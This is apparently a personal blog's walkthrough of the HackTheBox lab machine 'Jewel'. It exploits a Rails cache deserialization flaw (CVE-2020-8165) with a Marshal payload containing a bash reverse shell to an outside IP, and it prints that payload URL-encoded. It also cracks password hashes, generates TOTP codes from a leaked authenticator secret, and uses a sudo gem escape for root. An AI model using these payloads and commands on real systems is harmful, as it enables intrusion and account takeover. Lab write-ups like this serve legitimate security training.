---
layout: post
author: Razor
title: "Hackthebox Jewel"
categories: [Hackthebox, Linux]
tags: [boot2root, custom exploitation, medium-box, privilage escalation, cve, web exploitation, enumeration]     # TAG names should always be lowercase
image: assets/htb_jewel/bg_1.png
toc: true
---

## Introduction
This is partical room from hackthebox entitled jewel with Medium difficulty. In this room we will learn about code analysis of a Ruby on Rails web application . This reveals an unsafe use of RedisCacheStore (CVE-2020-8165), which is leveraged to get RCE. After archiving a foothold, we get command execution in the context of the unprivileged user and in this room using oathtool for google authentication  . room link [here](https://tryhackme.com/room/enpass)

## Enumeration 

### Nmap 

First time we have to do is scanning the Machine :

```
$ sudo nmap 10.10.10.211 -sC -sV
[sudo] password for razor: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 01:19 WIB
Nmap scan report for 10.10.10.211
Host is up (0.25s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)
|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)
|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)
8000/tcp open  http    Apache httpd 2.4.38
|_http-generator: gitweb/2.20.1 git/2.20.1
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: 10.10.10.211 Git
|_Requested resource was http://10.10.10.211:8000/gitweb/
8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
|_http-title: BL0G!
Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.72 seconds
```
from the results issued by nmap we get 3 open ports where port 22 is ssh, port 8000 is apache webserver, and port 8080 is nginx. now lets check port 8000 first and look at sumarry 

![img](/assets/htb_jewel/bg_2.png)

There is a git repo and we can download snapshot from this repository 
```
wget '10.10.10.211:8000/gitweb/?p=.git;a=snapshot;h=HEAD;sf=tgz' -O snapshot.tgz
tar xvzf snapshot.tgz

cd .git-5d6f436 
```

![img](/assets/htb_jewel/bg_3.png)

Let's take a look at this, Gemfile shows the version of rails which will be released in 2020. After I did some research I found a [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165) where we can deserialization vulnerability leading to RCE.

The vulnerability is indicated by the presence of the raw: true option code, which can trigger untrusted string deserialization in marshal. here I am using grep to find vulnerable code : 

![img](/assets/htb_jewel/bg_4.png)

here we can see the output of grep where there are 2 vulnerabilities here, such as:

- users_controller.rb 
```bat
 def update
    @user = User.find(params[:id])
    if @user && @user == current_user
      cache = ActiveSupport::Cache::RedisCacheStore.new(url: "redis://127.0.0.1:6379/0")
      cache.delete("username_#{session[:user_id]}")
      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) {user_params[:username]}
      if @user.update(user_params)
        flash[:success] = "Your account was updated successfully"
        redirect_to articles_path
      else
        cache.delete("username_#{session[:user_id]}")
        render 'edit'
      end
    else
      flash[:danger] = "Not authorized"
      redirect_to articles_path
    end
  end
```
- application_controller.rb
```bat
def current_username
    if session[:user_id]
      cache = ActiveSupport::Cache::RedisCacheStore.new(url: "redis://127.0.0.1:6379/0")
      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) do
        @current_user = current_user
        @current_username = @current_user.username
      end
    else
      @current_username = "guest"
    end
    return @current_username
  end
```

This method is an update that is called when the user updates and sets the username_id value without any checking and cleaning. After i did a search here i saw user.rb which contains code like username must be unique between 3 to 25 characters long and contain only alphanumeric characters

```bat
class User < ActiveRecord::Base
 has_many :articles
 has_secure_password
 VALID_USER_REGEX = /\A[\w\d]+\z/
 VALID_EMAIL_REGEX = /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i
 validates :username, presence: true, uniqueness: { case_sensitive: false }, length: { minimum: 3, maximum: 25 },
                      format: { with: VALID_USER_REGEX }
 validates :email, presence: true, length: { maximum: 105 }, uniqueness: { case_sensitive: false }, 
                   format: { with: VALID_EMAIL_REGEX }
 before_save { self.email = email.downcase }
end

```
This logic is very bad, because the serial marshal object is dangerous if set as the username, it is also written to the cache, and fails to update the database. Cached objects must be deleted immediately because no deletion will cause server errors and the operation to be aborted. this will allow the attacker to store arbitrary serial code and will trigger its deserialization which may result in code execution (RCE)

## Foothold

Vulnerability is in update profile user, we can register at here http://10.10.10.211:8080/signup. After that, click on profile and you can edit username

![img](/assets/htb_jewel/bg_5.png)

After registration you can also login. Now lets install rails and go to folder then we can build payload based on github 
```
$ sudo apt install rails
$ rails new ex
$ cd ex
$ rails console 
```
before we go in console you must set Netcat listener for revershell in another terminal, if you done let's build some payload : 
```
> code='`/bin/bash -c "bash -i &>/dev/tcp/10.10.14.54/4444 0>&1"`'
> erb=ERB.allocate
> erb.instance_variable_set:@src, code
> erb.instance_variable_set:@filename, "1"
> erb.instance_variable_set:@lineno, 1
> payload=Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb,:result)
> require'uri'
> puts URI.encode_www_form(payload:payload)
```
![img](/assets/htb_jewel/bg_6.png)

Now i have payload : 
```
payload=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3E%60%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.54%2F4444+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
```
Now lets exploit this. in this case i'm using burpsuite to put the payload in username 

![img](/assets/htb_jewel/bg_7.png)
Before update user you must turn on intercept in burpsuite
![img](/assets/htb_jewel/bg_8.png)
change username to payload for revershell and after that you can forward and intercept of then look at your browser
![img](/assets/htb_jewel/bg_9.png)
in this case dont reload the page but just enter on address. then you must be getting a shell
![img](/assets/htb_jewel/bg_10.png)
Now we have user bill

## Privilage Escalation

After I went around and did the enumeration of the file system I found this `/var/backups/dump_2020-08-27.sql ` and i found username and hash of password : 

![img](/assets/htb_jewel/bg_11.png)

```
echo '$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW' > pas_hash
echo '$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO' >> pas_hash
```
In this case im using `hashcat` for crack the password : 

![img](/assets/htb_jewel/bg_12.png)

and I managed to get one of those two hashes 
```
$ hashcat -D 2 -m 3200 hashes ~/Documents/Wordlist/rockyou.txt --show                                      130 ⨯
$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW:spongebob
```
lets check this : 
```
bill@jewel:~$ sudo -l
[sudo] password for bill: 
Verification code: 
```
user using google authenticator and as you can see we have folder .google_authenticator
![img](/assets/htb_jewel/bg_13.png)

we can use this secret key to generate OTP on our machines 
```
apt install oathtool
oathtool -b --totp '2UQI3R52WFCLE6JTLDCSJYMJH4
```
![img](/assets/htb_jewel/bg.png)

> note : your time must be the same as the time in the jewel machine, you can change it by means of timedatectl or date -s

The GTFOBins repo provides an example of how this binary can be abused in order to get a root
shell. [Link](https://gtfobins.github.io/gtfobins/gem/#sudo)

`gem open -e "/bin/sh -c /bin/sh" rdoc`

![img](/assets/htb_jewel/root_flag.png)

Boom!!! We are root now

Happy hacking :D